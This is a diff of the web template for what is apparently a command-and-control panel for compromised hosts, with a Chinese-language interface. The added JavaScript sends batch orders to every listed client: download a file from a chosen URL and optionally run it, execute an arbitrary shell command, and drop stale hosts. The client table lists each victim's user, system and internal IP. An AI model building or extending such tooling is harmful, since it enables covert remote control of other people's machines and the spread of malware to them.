@@ -43,6 +43,69 @@
             overflow: auto;
         }
     </style>
+    <script type="text/javascript">
+        function batch_download() {
+            
+            var http=prompt("下载地址","http://baidu.com");
+            var path=prompt("保存路径","/tmp/aaa.exe");
+            var isrun=prompt("是否运行(yes or no)","no");
+            let lists = document.getElementsByName("category");
+
+            let temp = [];
+            for (let i = 0; i < lists.length; i++) {
+                    temp.push(lists[i].value);
+                }
+            fetch('all?action=download', {
+                headers: {
+                  'content-type': 'application/json'
+                },
+                method: 'post',
+                body:JSON.stringify({"http":http,"path":path,"is_run":isrun,"target":temp})
+
+            })
+        };
+        function batch_cmd() {
+            
+            var command=prompt("命令","whoami");
+            let lists = document.getElementsByName("category");
+
+            let temp = [];
+            for (let i = 0; i < lists.length; i++) {
+                    temp.push(lists[i].value);
+                }
+            fetch('all?action=shell', {
+                headers: {
+                      'content-type': 'application/json'
+                    },
+                method: 'post',
+                body:JSON.stringify({
+                    "command":command,
+                    "target":temp
+                })
+            })
+        }
+
+
+        function batch_clear() {
+            var time=prompt("清理超时 ()s 的主机","600");
+            fetch('all?action=clear', {
+                 headers: {
+                  'content-type': 'application/json'
+                },
+                method: 'post',
+                body: JSON.stringify({
+                    "time":time
+                })
+            })
+            alert("清理成功");
+            
+        }
+        function generate() {
+            
+            alert("自己编译，俺懒得写了！");
+            
+        }
+    </script>
 
    
 </head>
@@ -56,7 +119,8 @@
 <!--        <button id="btn_refresh" type="button">Setting</button>-->
         <button id="btn_Down" type="button" onclick="batch_download();">Download</button>
         <button id="btn_execute" type="button" onclick="batch_cmd();">Execute</button>
-<!--        <button id="btn_del" type="button">Delete</button>-->
+        <button id="btn_del" type="button" onclick="batch_del();">Delete</button>
+        <button id="btn_clear" type="button" onclick="batch_clear();">Clear</button>
         <button id="btn_gen" type="button" onclick="generate();">Generate</button>
     </div>
     <br>
@@ -84,8 +148,8 @@
                 <td> {{ i.info.remarks }}</td>
                 <td> {{ i.info.system }}</td>
                 <td> {{ i.info.user }}</td>
-                <td> {{ i.sleep }}</td>
-                <td>{{ i.heartbeat }}s</td>-->
+                <td> {{ i.sleep }}s</td>
+                <td>{{ i.hb }}s</td>
                 <td>{{i.info.iip}}</td>
                 <td><a href="client/{{i.uuid}}">操作</a>  <a href="#">删除</a></td>
             </tr>
@@ -110,15 +174,13 @@
          style="margin-left:10%;margin-right:11%;text-align:left;margin-top: 50px;max-height: 20%">
         <h2>日志</h2>
         <div id="log" style="border-style:solid; border-width:1px; border-color:#000;">
-            {% for i in events %}
-                <p style='color:green'> {{ i }}</p>
+            {% for i in event %}
+                <p style='color:green'> {{ i.data }}</p>
             {% endfor %}
         </div>
     </div>
     <div id="title_bar" width="80%"
          style="margin-left:10%;margin-right:11%;text-align:center;margin-top: 50px;max-height: 20%">
-        <!-- <ul id="myTab" class="nav nav-tabs">
-        </ul> -->
 
     </div>
 
